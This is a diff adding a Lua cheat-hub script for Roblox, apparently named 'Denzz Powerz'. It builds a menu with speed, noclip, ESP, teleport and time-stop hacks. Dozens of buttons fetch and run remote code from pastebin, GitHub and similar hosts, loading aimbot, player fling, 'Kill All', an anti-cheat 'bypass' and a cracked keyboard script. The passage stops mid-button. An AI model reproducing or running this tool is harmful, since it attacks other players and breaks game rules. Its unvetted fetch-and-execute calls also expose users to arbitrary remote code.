@@ -1,0 +1,1651 @@
+--// Denzz Powerz – TAM SÜRÜM (TÜM BUTONLAR + 2 TOOL TELEPORT)
+--// Click Teleport + Teleport to Players
+--// Düzeltildi ve Optimize Edildi.
+
+local ScreenGui = Instance.new("ScreenGui")
+local MainFrame = Instance.new("Frame")
+local TitleBar = Instance.new("Frame")
+local TitleLabel = Instance.new("TextLabel")
+local CloseButton = Instance.new("TextButton")
+local ScrollFrame = Instance.new("ScrollingFrame")
+local TextLabel = Instance.new("TextLabel")
+
+local player = game.Players.LocalPlayer
+local PlayerGui = player:WaitForChild("PlayerGui")
+
+ScreenGui.Name = "UpdateGui"
+ScreenGui.Parent = PlayerGui
+ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+ScreenGui.ResetOnSpawn = false
+
+MainFrame.Name = "MainFrame"
+MainFrame.Parent = ScreenGui
+MainFrame.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
+MainFrame.BorderSizePixel = 0
+MainFrame.Size = UDim2.new(0, 350, 0, 250)
+MainFrame.Position = UDim2.new(0.5, -175, 0.5, -125)
+MainFrame.Active = true
+MainFrame.Draggable = true
+MainFrame.ClipsDescendants = true
+
+TitleBar.Name = "TitleBar"
+TitleBar.Parent = MainFrame
+TitleBar.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+TitleBar.Size = UDim2.new(1, 0, 0, 30)
+
+TitleLabel.Parent = TitleBar
+TitleLabel.BackgroundTransparency = 1
+TitleLabel.Size = UDim2.new(1, -40, 1, 0)
+TitleLabel.Position = UDim2.new(0, 10, 0, 0)
+TitleLabel.Font = Enum.Font.GothamBold
+TitleLabel.Text = "Update Information"
+TitleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+TitleLabel.TextSize = 16
+TitleLabel.TextXAlignment = Enum.TextXAlignment.Left
+
+CloseButton.Name = "CloseButton"
+CloseButton.Parent = TitleBar
+CloseButton.Text = "X"
+CloseButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+CloseButton.Font = Enum.Font.GothamBold
+CloseButton.TextSize = 18
+CloseButton.Size = UDim2.new(0, 30, 1, 0)
+CloseButton.Position = UDim2.new(1, -30, 0, 0)
+CloseButton.BackgroundColor3 = Color3.fromRGB(60, 0, 0)
+CloseButton.BorderSizePixel = 0
+
+ScrollFrame.Name = "ScrollFrame"
+ScrollFrame.Parent = MainFrame
+ScrollFrame.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
+ScrollFrame.Size = UDim2.new(1, 0, 1, -30)
+ScrollFrame.Position = UDim2.new(0, 0, 0, 30)
+ScrollFrame.CanvasSize = UDim2.new(0, 0, 3, 0)
+ScrollFrame.ScrollBarThickness = 6
+
+TextLabel.Parent = ScrollFrame
+TextLabel.BackgroundTransparency = 1
+TextLabel.Size = UDim2.new(1, -20, 1, 0)
+TextLabel.Position = UDim2.new(0, 10, 0, 0)
+TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel.TextXAlignment = Enum.TextXAlignment.Left
+TextLabel.TextYAlignment = Enum.TextYAlignment.Top
+TextLabel.Font = Enum.Font.Code
+TextLabel.TextSize = 14
+TextLabel.TextWrapped = true
+TextLabel.Text = [[
+Version: 11 (Latest Version)
+New Buttons:Anti Fling,Illusion 
+1 Button's Location Changed 
+
+Notes:
+If You Use This İn Games With Anticheat, You May Get Banned!
+
+Keys:
+Fisch Script Key:Eps1llon
+The Strongest Battleground Key:HOKALAZA UPDATE
+
+Meanings of Abbreviations:
+VS/CS (Visual / Client Sided):(Script That Only Appears on Your Screen) 
+HVS/HCS (Half Client Sided / Half Visual):Even Though The Script İs Visible To Everyone, Some Of İts Features Are Only Visible To You
+JBP (Just a Baseplate):Just for "Just a Baseplate" Game 
+NKS (Need Keyboard Script):Since The Script Contains Key Assignments For Computers, You Need a Keyboard Script İf You Are On Mobile
+CT (Click Twice):You Must Click The Button Twice 
+NCS (Need CurrentAngle V2 Script):CurrentAngle Must Be Executed For Animation Scripts To Be Visible Everyone 
+
+(Use Infinite Yield's Fling To Use Click Fling)
+(Scripts in Games Tab İs Risky)
+(Do Not Use Boost In The Tower Of Hell Script)
+(Time Stop İs Visual But %50 Workable)
+(Don't Run All Flings At Once)
+(God Mode For Parkour Games Only)
+(Jump Booster İs %50 Workable) 
+ 
+Thanks For Reading!
+]]
+
+CloseButton.MouseButton1Click:Connect(function()
+	MainFrame:Destroy()
+end)
+
+MainFrame.BackgroundTransparency = 1
+TitleBar.BackgroundTransparency = 1
+ScrollFrame.BackgroundTransparency = 1
+TextLabel.TextTransparency = 1
+for i = 1, 0, -0.1 do
+	MainFrame.BackgroundTransparency = i
+	TitleBar.BackgroundTransparency = i
+	ScrollFrame.BackgroundTransparency = i
+	TextLabel.TextTransparency = i
+	task.wait(0.05)
+end
+
+-- Rayfield GUI Başlangıcı
+task.wait(5.5)
+local Rayfield = loadstring(game:HttpGet("https://sirius.menu/rayfield"))()
+
+local Window = Rayfield:CreateWindow({
+    Name = "Denzz Powerz",
+    LoadingTitle = "Loading...",
+    LoadingSubtitle = "By denzzexploiter",
+    KeySystem = false,
+    ShowText = "Powerz"
+})
+
+local UIS = game:GetService("UserInputService")
+local RunService = game:GetService("RunService")
+local PlayersService = game:GetService("Players")
+local Camera = workspace.CurrentCamera
+local Lighting = game:GetService("Lighting")
+local TweenService = game:GetService("TweenService")
+local HttpService = game:GetService("HttpService")
+local GuiService = game:GetService("GuiService")
+
+local oldBrightness = Lighting.Brightness
+local oldAmbient = Lighting.Ambient
+local oldOutdoorAmbient = Lighting.OutdoorAmbient
+
+-- Abilities Tab
+local AbilitiesTab = Window:CreateTab("Abilities", nil)
+
+-- Speed Booster
+local speedValue = 16
+AbilitiesTab:CreateSlider({
+    Name = "Speed Booster",
+    Range = {16, 500},
+    Increment = 1,
+    CurrentValue = 16,
+    Callback = function(value)
+        speedValue = value
+        local humanoid = player.Character and player.Character:FindFirstChild("Humanoid")
+        if humanoid then
+            humanoid.WalkSpeed = value
+        end
+    end
+})
+
+-- Jump Booster
+local jumpValue = 50
+AbilitiesTab:CreateSlider({
+    Name = "Jump Booster",
+    Range = {50, 500},
+    Increment = 1,
+    CurrentValue = 50,
+    Callback = function(value)
+        jumpValue = value
+        local humanoid = player.Character and player.Character:FindFirstChild("Humanoid")
+        if humanoid then
+            humanoid.JumpPower = value
+        end
+    end
+})
+
+-- Infinite Jump
+local InfiniteJumpEnabled = false
+local IJConnection
+AbilitiesTab:CreateToggle({
+    Name = "Infinite Jump",
+    CurrentValue = false,
+    Callback = function(value)
+        InfiniteJumpEnabled = value
+        if value then
+            IJConnection = UIS.JumpRequest:Connect(function()
+                if InfiniteJumpEnabled then
+                    local humanoid = player.Character and player.Character:FindFirstChild("Humanoid")
+                    if humanoid then
+                        humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
+                    end
+                end
+            end)
+        else
+            if IJConnection then
+                IJConnection:Disconnect()
+                IJConnection = nil
+            end
+        end
+    end
+})
+
+-- Location
+AbilitiesTab:CreateButton({
+    Name = "Location",
+    Callback = function()
+        loadstring(game:HttpGet("https://pastefy.app/Imhye8mw/raw"))()
+    end
+})
+
+-- TELEKINESIS
+AbilitiesTab:CreateButton({
+    Name = "Telekinesis",
+    Callback = function()
+        local success, err = pcall(function()
+            loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Fe-Telekinesis-V5-21542"))()
+        end)
+        if not success then
+            warn("Telekinesis yüklenemedi: " .. err)
+        end
+    end
+})
+
+-- FREEZE YOURSELF
+AbilitiesTab:CreateButton({
+    Name = "Freeze Yourself",
+    Callback = function()
+        local character = player.Character or player.CharacterAdded:Wait()
+        local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
+
+        if PlayerGui:FindFirstChild("FreezeGui") then
+            PlayerGui:FindFirstChild("FreezeGui"):Destroy()
+        end
+        
+        local screenGui = Instance.new("ScreenGui")
+        screenGui.Name = "FreezeGui"
+        screenGui.Parent = PlayerGui
+        screenGui.ResetOnSpawn = false
+
+        local button = Instance.new("TextButton")
+        button.Size = UDim2.new(0, 100, 0, 50)
+        button.Position = UDim2.new(0.4, 0, 0.4, 0)
+        button.Text = "Freeze Yourself"
+        button.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+        button.Parent = screenGui
+
+        local dragging
+        local dragInput
+        local dragStart
+        local startPos
+
+        local function update(input)
+            local delta = input.Position - dragStart
+            button.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+        end
+
+        button.InputBegan:Connect(function(input)
+            if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+                dragging = true
+                dragStart = input.Position
+                startPos = button.Position
+
+                input.Changed:Connect(function()
+                    if input.UserInputState == Enum.UserInputState.End then
+                        dragging = false
+                    end
+                end)
+            end
+        end)
+
+        button.InputChanged:Connect(function(input)
+            if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+                dragInput = input
+            end
+        end)
+
+        UIS.InputChanged:Connect(function(input)
+            if input == dragInput and dragging then
+                update(input)
+            end
+        end)
+
+        local isFrozen = false
+        button.MouseButton1Click:Connect(function()
+            isFrozen = not isFrozen
+            if isFrozen then
+                humanoidRootPart.Anchored = true
+                button.Text = "Stop Freeze"
+                button.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
+            else
+                humanoidRootPart.Anchored = false
+                button.Text = "Freeze Yourself"
+                button.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+            end
+        end)
+    end
+})
+
+-- Fly
+AbilitiesTab:CreateButton({
+    Name = "Fly",
+    Callback = function()
+        loadstring(game:HttpGet("https://github.com/MiniCapy/scripts/raw/refs/heads/main/fly%20GUI"))()
+    end
+})
+
+-- CLICK TELEPORT
+AbilitiesTab:CreateButton({
+    Name = "Teleport",
+    Callback = function()
+        local backpack = player:WaitForChild("Backpack")
+
+        if backpack:FindFirstChild("Click Teleport") then
+            backpack["Click Teleport"]:Destroy()
+        end
+        
+        local mouse = player:GetMouse()
+        local tool = Instance.new("Tool")
+        tool.RequiresHandle = false
+        tool.Name = "Click For Teleport "
+        tool.Activated:Connect(function()
+            local char = player.Character
+            if char and char:FindFirstChild("HumanoidRootPart") and mouse.Hit then
+                local pos = mouse.Hit.Position + Vector3.new(0, 2.5, 0)
+                char.HumanoidRootPart.CFrame = CFrame.new(pos)
+            end
+        end)
+        tool.Parent = backpack
+    end
+}) 
+
+-- Flashback
+local flashbackActive = false
+local flashbackFrames = {}
+local maxFrames = 600
+local function getCharacter()
+    return player.Character or player.CharacterAdded:Wait()
+end
+local function getHRP(char)
+    return char:FindFirstChild("HumanoidRootPart") or char.PrimaryPart
+end
+local function recordFrame()
+    local char = getCharacter()
+    local hrp = getHRP(char)
+    local hum = char:FindFirstChildWhichIsA("Humanoid")
+    if not hrp or not hum then return end
+    if #flashbackFrames > maxFrames then
+        table.remove(flashbackFrames, 1)
+    end
+    table.insert(flashbackFrames, {
+        CFrame = hrp.CFrame,
+        Velocity = hrp.AssemblyLinearVelocity,
+        State = hum:GetState(),
+        PlatformStand = hum.PlatformStand
+    })
+end
+local function revertFrame()
+    local char = getCharacter()
+    local hrp = getHRP(char)
+    local hum = char:FindFirstChildWhichIsA("Humanoid")
+    if not hrp or not hum or #flashbackFrames == 0 then return end
+    local lastFrame = flashbackFrames[#flashbackFrames]
+    table.remove(flashbackFrames, #flashbackFrames)
+    hrp.CFrame = lastFrame.CFrame
+    hrp.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
+    hum:ChangeState(lastFrame.State)
+    hum.PlatformStand = lastFrame.PlatformStand
+end
+
+RunService.Stepped:Connect(function()
+    if flashbackActive then
+        revertFrame()
+    else
+        recordFrame()
+    end
+end)
+
+AbilitiesTab:CreateButton({
+    Name = "Flashback",
+    Callback = function()
+        flashbackActive = not flashbackActive
+        local backpack = player:WaitForChild("Backpack")
+        local toolName = "Flashback"
+
+        if flashbackActive then
+            if not backpack:FindFirstChild(toolName) then
+                local flashbackItem = Instance.new("Tool")
+                flashbackItem.Name = toolName
+                flashbackItem.RequiresHandle = false
+                flashbackItem.CanBeDropped = false
+                flashbackItem.Activated:Connect(function()
+                    flashbackActive = not flashbackActive
+                end)
+                flashbackItem.Parent = backpack
+            end
+        else
+            if backpack:FindFirstChild(toolName) then
+                backpack[toolName]:Destroy()
+            end
+        end
+    end
+})
+
+AbilitiesTab:CreateButton({
+    Name = "Illusion",
+    Callback = function()
+        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-FE-Illusion-Script-12744"))()
+    end
+})
+
+-- God Mode
+AbilitiesTab:CreateButton({
+    Name = "God Mode",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Rawbr10/Roblox-Scripts/refs/heads/main/God%20Mode%20Script%20Universal"))()
+        loadstring(game:HttpGet("https://gist.githubusercontent.com/DagerFild/b4776075a0d26ef04394133ee6bd2081/raw/AntiVoid.lua", true))()
+    end
+})
+
+AbilitiesTab:CreateButton({
+    Name = "Air Walk",
+    Callback = function()
+        loadstring(game:HttpGet("https://pastefy.app/fxMc5WQH/raw"))()
+    end
+})
+
+-- Invisible
+AbilitiesTab:CreateButton({
+    Name = "Invisible",
+    Callback = function()
+        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Invisible-FE-19153"))()
+        loadstring(game:HttpGet("https://gist.githubusercontent.com/skid123skidlol/cd0d2dce51b3f20ad1aac941da06a1a1/raw/f58b98cce7d51e53ade94e7bb460e4f24fb7e0ff/%257BFE%257D%2520Invisible%2520Tool%2520(can%2520hold%2520tools)", true))()
+    end
+})
+
+-- Noclip
+local noclipActive = false
+local NoclipConnection
+AbilitiesTab:CreateToggle({
+    Name = "Noclip",
+    CurrentValue = false,
+    Callback = function(value)
+        noclipActive = value
+        if noclipActive then
+            NoclipConnection = RunService.Stepped:Connect(function()
+                if player.Character then
+                    for _, part in pairs(player.Character:GetDescendants()) do
+                        if part:IsA("BasePart") then
+                            part.CanCollide = false
+                        end
+                    end
+                end
+            end)
+        else
+            if NoclipConnection then
+                NoclipConnection:Disconnect()
+            end
+            if player.Character then
+                for _, part in pairs(player.Character:GetDescendants()) do
+                    if part:IsA("BasePart") then
+                        part.CanCollide = true
+                    end
+                end
+            end
+        end
+    end
+})
+
+-- Dash
+AbilitiesTab:CreateButton({
+    Name = "Dash",
+    Callback = function()
+        local backpack = player:WaitForChild("Backpack")
+        
+        if backpack:FindFirstChild("Dash") then
+            backpack.Dash:Destroy()
+        end
+        
+        local dashItem = Instance.new("Tool")
+        dashItem.Name = "Dash"
+        dashItem.RequiresHandle = false
+        dashItem.CanBeDropped = false
+        dashItem.Activated:Connect(function()
+            local char = player.Character
+            if char and char:FindFirstChild("HumanoidRootPart") then
+                local hrp = char.HumanoidRootPart
+                local bodyVel = Instance.new("BodyVelocity")
+                bodyVel.Velocity = hrp.CFrame.LookVector * 100
+                bodyVel.MaxForce = Vector3.new(100000,0,100000)
+                bodyVel.Parent = hrp
+                game:GetService("Debris"):AddItem(bodyVel,0.3)
+            end
+        end)
+        dashItem.Parent = backpack
+    end
+})
+
+-- PLAYERS TAB
+local PlayersTab = Window:CreateTab("Players", nil)
+
+PlayersTab:CreateButton({
+    Name = "Teleport To Players",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/khenn791/script-khen/refs/heads/main/TeleportPlayers", true))()
+    end
+})
+
+-- Spectate Players
+PlayersTab:CreateButton({
+    Name = "Spectate Players",
+    Callback = function()
+        local gui = PlayerGui:FindFirstChild("SpectateGui")
+        if gui then gui:Destroy() end
+
+        gui = Instance.new("ScreenGui", PlayerGui)
+        gui.Name = "SpectateGui"
+        local nextb = Instance.new("TextButton", gui)
+        nextb.Position = UDim2.new(0.88, 0, 0.9, 0)
+        nextb.Size = UDim2.new(0.1, 0, 0.07, 0)
+        nextb.Style = Enum.ButtonStyle.RobloxRoundDropdownButton
+        nextb.Text = "Next"
+        local prevb = nextb:Clone()
+        prevb.Position = UDim2.new(0.02, 0, 0.9, 0)
+        prevb.Text = "Previous"
+        prevb.Parent = gui
+        
+        local playersList = PlayersService:GetPlayers()
+        local plrNum = 1
+        
+        local function updateSpectate()
+            playersList = PlayersService:GetPlayers()
+            if #playersList == 0 then return end
+            
+            local targetPlayer = playersList[plrNum]
+            if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("Humanoid") then
+                Camera.CameraSubject = targetPlayer.Character.Humanoid
+            end
+        end
+        
+        updateSpectate()
+
+        prevb.MouseButton1Click:Connect(function()
+            plrNum = plrNum - 1
+            if plrNum < 1 then 
+                plrNum = #PlayersService:GetPlayers() 
+            end
+            updateSpectate()
+        end)
+        
+        nextb.MouseButton1Click:Connect(function()
+            plrNum = plrNum + 1
+            if plrNum > #PlayersService:GetPlayers() then 
+                plrNum = 1 
+            end
+            updateSpectate()
+        end)
+    end
+})
+
+-- Fling Players
+PlayersTab:CreateButton({
+    Name = "Fling Players",
+    Callback = function()
+        loadstring(game:HttpGet("https://pastebin.com/raw/1n6QrFB1"))()
+    end
+})
+
+-- ESP toggle
+local espEnabled = false
+local espConnections = {}
+local function createNameTag(character, playerName)
+    if character:FindFirstChild("ESPNameTag") then
+        character.ESPNameTag:Destroy()
+    end
+    local billboardGui = Instance.new("BillboardGui")
+    billboardGui.Name = "ESPNameTag"
+    billboardGui.Adornee = character:FindFirstChild("Head")
+    billboardGui.Size = UDim2.new(0, 80, 0, 20)
+    billboardGui.StudsOffset = Vector3.new(0, 2, 0)
+    billboardGui.AlwaysOnTop = true
+    billboardGui.MaxDistance = 1000
+
+    local textLabel = Instance.new("TextLabel")
+    textLabel.Size = UDim2.new(1, 0, 1, 0)
+    textLabel.BackgroundTransparency = 1
+    textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+    textLabel.Text = playerName
+    textLabel.Font = Enum.Font.GothamBold
+    textLabel.TextSize = 10
+    textLabel.TextStrokeTransparency = 0.8
+    textLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+    textLabel.Parent = billboardGui
+    billboardGui.Parent = character
+end
+
+local function updateESP(player)
+    if player == game.Players.LocalPlayer then return end
+    if espEnabled and player.Character then
+        local character = player.Character
+        local highlight = character:FindFirstChild("Highlight")
+        if not highlight then
+            highlight = Instance.new("Highlight")
+            highlight.Name = "Highlight"
+            highlight.Adornee = character
+            highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
+            highlight.FillColor = Color3.fromRGB(255, 255, 255)
+            highlight.OutlineColor = Color3.fromRGB(255, 255, 255)
+            highlight.Parent = character
+        end
+        createNameTag(character, player.Name)
+    elseif player.Character then
+        local highlight = player.Character:FindFirstChild("Highlight")
+        if highlight then
+            highlight:Destroy()
+        end
+        local nameTag = player.Character:FindFirstChild("ESPNameTag")
+        if nameTag then
+            nameTag:Destroy()
+        end
+    end
+end
+
+local function clearESP()
+    for _, p in pairs(PlayersService:GetPlayers()) do
+        if p ~= player and p.Character then
+            local highlight = p.Character:FindFirstChild("Highlight")
+            if highlight then
+                highlight:Destroy()
+            end
+            local nameTag = p.Character:FindFirstChild("ESPNameTag")
+            if nameTag then
+                nameTag:Destroy()
+            end
+        end
+    end
+end
+
+PlayersTab:CreateToggle({
+    Name = "Players Esp",
+    CurrentValue = false,
+    Callback = function(value)
+        espEnabled = value
+        if value then
+            for _, p in pairs(PlayersService:GetPlayers()) do
+                updateESP(p)
+                local charConnection
+                charConnection = p.CharacterAdded:Connect(function()
+                    if espEnabled then
+                        updateESP(p)
+                    end
+                end)
+                espConnections[p] = charConnection
+            end
+            local playerAddedConnection = PlayersService.PlayerAdded:Connect(function(newPlayer)
+                if espEnabled then
+                    updateESP(newPlayer)
+                    local charConnection
+                    charConnection = newPlayer.CharacterAdded:Connect(function()
+                        if espEnabled then
+                            updateESP(newPlayer)
+                        end
+                    end)
+                    espConnections[newPlayer] = charConnection
+                end
+            end)
+            local playerRemovingConnection = PlayersService.PlayerRemoving:Connect(function(leavingPlayer)
+                if espConnections[leavingPlayer] then
+                    espConnections[leavingPlayer]:Disconnect()
+                    espConnections[leavingPlayer] = nil
+                end
+            end)
+            espConnections["PlayerAdded"] = playerAddedConnection
+            espConnections["PlayerRemoving"] = playerRemovingConnection
+        else
+            clearESP()
+            for _, conn in pairs(espConnections) do
+                conn:Disconnect()
+            end
+            espConnections = {}
+        end
+    end
+})
+
+-- Aim Bot
+PlayersTab:CreateButton({
+    Name = "Aim Bot",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/DanielHubll/DanielHubll/refs/heads/main/Aimbot%20Mobile"))()
+    end
+})
+
+-- General Tab
+local GeneralTab = Window:CreateTab("General", nil)
+
+GeneralTab:CreateButton({
+    Name = "Ring Parts",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/chesslovers69/Super-ring-parts-v6/refs/heads/main/Bylukaslol"))()
+    end
+})
+
+GeneralTab:CreateButton({
+    Name = "Free Camera",
+    Callback = function()
+        loadstring(game:HttpGet("https://pastebin.com/raw/sKQ1mSGy"))()
+    end
+})
+
+GeneralTab:CreateButton({
+    Name = "Shader",
+    Callback = function()
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/randomstring0/pshade-ultimate/refs/heads/main/src/cd.lua'))()
+    end
+})
+
+GeneralTab:CreateButton({
+    Name = "Crisis Bypass",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/weskidding/Crisis/refs/heads/main/Crisis.lua", true))()
+    end
+})
+
+GeneralTab:CreateButton({
+    Name = "Shiftlock",
+    Callback = function()
+        loadstring(game:HttpGet("https://pastebin.com/raw/XGF4fJuQ"))()
+    end
+})
+
+-- Time Stop
+local setting = settings().Network
+local Effect = Instance.new("ColorCorrectionEffect")
+Effect.Parent = Lighting
+Effect.Saturation = -1
+Effect.Brightness = 0
+Effect.Contrast = 0
+Effect.Enabled = false
+local defaultWalkSpeed = 16
+GeneralTab:CreateButton({
+    Name = "Time Stop",
+    Callback = function()
+        local char = player.Character
+        if not Effect.Enabled then
+            Effect.Enabled = true
+            setting.IncomingReplicationLag = 1000
+            if char and char:FindFirstChild("Humanoid") then
+                defaultWalkSpeed = char.Humanoid.WalkSpeed
+                char.Humanoid.WalkSpeed = char.Humanoid.WalkSpeed * 3
+            end
+        else
+            Effect.Enabled = false
+            setting.IncomingReplicationLag = 0
+            if char and char:FindFirstChild("Humanoid") then
+                char.Humanoid.WalkSpeed = defaultWalkSpeed
+            end
+        end
+    end
+})
+
+-- Zoom Toggle
+local defaultFOV = Camera.FieldOfView
+GeneralTab:CreateToggle({
+    Name = "Zoom",
+    CurrentValue = false,
+    Callback = function(value)
+        if value then
+            Camera.FieldOfView = 4
+        else
+            Camera.FieldOfView = defaultFOV
+        end
+    end
+})
+
+-- Full Bright
+GeneralTab:CreateToggle({
+    Name = "Full Bright",
+    CurrentValue = false,
+    Callback = function(value)
+        if value then
+            Lighting.Brightness = 2
+            Lighting.Ambient = Color3.new(1,1,1)
+            Lighting.OutdoorAmbient = Color3.new(1,1,1)
+        else
+            Lighting.Brightness = oldBrightness
+            Lighting.Ambient = oldAmbient
+            Lighting.OutdoorAmbient = oldOutdoorAmbient
+        end
+    end
+})
+
+-- Scripts & Packs Tab
+local ScriptsPacksTab = Window:CreateTab("Scripts & Packs", nil)
+
+ScriptsPacksTab:CreateButton({
+    Name = "Ban Hammer (R6) (VS/CS)",
+    Callback = function()
+        loadstring(game:HttpGet("https://pastebin.com/raw/vYEZNnPs"))()
+    end
+})
+
+ScriptsPacksTab:CreateButton({
+    Name = "Sin Dragon (R6) (JBP)",
+    Callback = function()
+        loadstring(game:HttpGet("https://rawscripts.net/raw/Just-a-baseplate.-Sin-dgon-for-bseplte-29677"))()
+    end
+})
+
+ScriptsPacksTab:CreateButton({
+    Name = "Delta Keyboard",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Xxtan31/Ata/main/deltakeyboardcrack.txt", true))()
+    end
+})
+
+ScriptsPacksTab:CreateButton({
+    Name = "Keyboard With Mouse",
+    Callback = function()
+        loadstring(game:HttpGet("https://pastebin.com/raw/TzGyGJMS", true))()
+    end
+})
+
+ScriptsPacksTab:CreateButton({
+    Name = "CurrentAngle V2 (R6)",
+    Callback = function()      
+        loadstring(game:HttpGet("https://pastefy.app/7U7ffJvK/raw"))()
+    end
+})
+
+ScriptsPacksTab:CreateButton({
+    Name = "Krystal Dance (R6) (NCS)",
+    Callback = function()
+        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-FIXED-Krystal-Dance-V3-48682"))()
+    end
+})
+
+ScriptsPacksTab:CreateButton({
+    Name = "Epik Dancezz (R6) (NCS)",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/gObl00x/My-Scripts/refs/heads/main/Epik%20R6%20Dancezz.lua"))()
+    end
+})
+
+ScriptsPacksTab:CreateButton({
+    Name = "Ban Hammer (JBP)",
+    Callback = function()
+        loadstring(game:HttpGet("https://rawscripts.net/raw/Just-a-baseplate.-Fe-ban-hammer-v1-remastered-46296"))()
+    end
+})
+
+ScriptsPacksTab:CreateButton({
+    Name = "AK-47 (VS/CS)",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/sinret/rbxscript.com-scripts-reuploads-/main/ak47", true))()
+    end
+})
+
+ScriptsPacksTab:CreateButton({
+    Name = "SCP 096 (R6)",
+    Callback = function()
+        loadstring(game:HttpGet("https://pastefy.app/YsJgITXR/raw"))()
+    end
+})
+
+ScriptsPacksTab:CreateButton({
+    Name = "Fighter (R6)",
+    Callback = function()      
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/Fe-ProjectR/FE-Files/785403033b2b9161076ddaddc65923a7290e274d/Fe%20fighter%20optimized'))()
+    end
+})
+
+ScriptsPacksTab:CreateButton({
+    Name = "Ultimate Animation (CT) (R15)",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Gazer-Ha/Free-emote/refs/heads/main/Delta%20mad%20stuffs"))()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/WaveStorag/Selenix/main/sac-main"))()
+    end
+})
+
+ScriptsPacksTab:CreateButton({
+    Name = "Anti Fling",
+    Callback = function()
+        loadstring(game:HttpGet("https://pastebin.com/raw/vrbauj8M"))()
+    end
+})
+
+ScriptsPacksTab:CreateButton({
+    Name = "Control Npc",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/randomstring0/Qwerty/refs/heads/main/qwerty38.lua"))()
+    end
+})
+
+ScriptsPacksTab:CreateButton({
+    Name = "Guest 666 (R6) (VS/CS) (NKS)",
+    Callback = function()
+       loadstring(game:HttpGet("https://raw.githubusercontent.com/gObl00x/My-Scripts/refs/heads/main/Guest%20666.lua"))()
+    end
+})
+
+ScriptsPacksTab:CreateButton({
+    Name = "John Doe (VS/CS) (R6)",
+    Callback = function()
+        loadstring(game:HttpGet("https://rawscripts.net/raw/Client-Replication-John-doe-up-by-gojohdkaisenkt-34198"))()
+    end
+})
+
+ScriptsPacksTab:CreateButton({
+    Name = "Better Movement Animations (NCS) (R6) (R15)",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Gazer-Ha/Gaze-stuff/refs/heads/main/Fe%20Better%3F%20Movement"))()
+    end
+})
+
+ScriptsPacksTab:CreateButton({
+    Name = "Fly With Animations (R6) (NKS)",
+    Callback = function()
+        loadstring(game:HttpGet("https://pastebin.com/raw/NzVMcSbJ"))()
+    end
+})
+
+ScriptsPacksTab:CreateButton({
+    Name = "Fly With Animations (R15)",
+    Callback = function()
+        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Invinicible-Flight-R15-45414"))()
+    end
+})
+
+ScriptsPacksTab:CreateButton({
+    Name = "Fake R6",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Imagnir/r6_anims_for_r15/main/r6_anims.lua", true))()
+    end
+})
+
+ScriptsPacksTab:CreateButton({
+    Name = "R15 To R6 (VS/CS)",
+    Callback = function()
+        loadstring(game:HttpGet(('https://pastebin.com/raw/9wJepMwY'),true))()
+    end
+})
+
+ScriptsPacksTab:CreateButton({
+    Name = "Ultimate Trolling Gui ",
+    Callback = function()
+        loadstring(game:HttpGet("https://pastefy.app/eQA7OWqN/raw"))()
+    end
+})
+
+ScriptsPacksTab:CreateButton({
+    Name = "T Pose (R6)",
+    Callback = function()
+        local Anim = Instance.new("Animation")
+        Anim.AnimationId = "rbxassetid://235542946"
+        local k = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
+        k:Play()
+        k:AdjustSpeed(0)
+        wait(999)
+        k:AdjustSpeed(0)
+        wait(9999)
+        k:Stop()
+    end
+})
+
+ScriptsPacksTab:CreateButton({
+    Name = "Jab Hub (JBP)",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/inkdupe/hat-scripts/refs/heads/main/JABhub", true))()
+    end
+})
+
+ScriptsPacksTab:CreateButton({
+    Name = "RobHub ",
+    Callback = function()
+        loadstring(game:HttpGet("https://pastebin.com/raw/KSvbtcPE"))()
+    end
+})
+
+ScriptsPacksTab:CreateButton({
+    Name = "Kill All (Sword)",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Rawbr10/test/refs/heads/main/Kill%20All%20Script%20Universal"))()        
+    end
+})
+
+ScriptsPacksTab:CreateButton({
+    Name = "Jab Hub Classic (JBP)",
+    Callback = function()
